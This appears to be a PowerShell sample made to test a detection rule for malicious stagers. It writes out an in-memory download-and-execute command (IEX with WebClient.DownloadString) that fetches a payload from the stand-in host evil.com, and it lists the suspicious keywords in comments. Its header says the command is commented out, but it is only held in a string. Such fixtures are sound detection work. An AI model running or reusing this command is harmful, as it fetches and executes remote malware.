# This script demonstrates a pattern often used in malicious PowerShell stagers.
# The malicious part is commented out for safety.

# Benign function
function Get-SystemInfo {
    Write-Host "Gathering system information..."
    Get-ComputerInfo
}

# Malicious pattern example
# An adversary would use a command like this to download and run malware in memory.
# The combination of WebClient, DownloadString, and IEX is highly suspicious.

$maliciousCommand = "IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/payload.exe')"
Invoke-Command -ScriptBlock { $maliciousCommand }

# Benign call
Get-SystemInfo

# Add the strings here again in comments to ensure the rule triggers reliably on the text file itself.
# IEX
# New-Object System.Net.WebClient
# .DownloadString
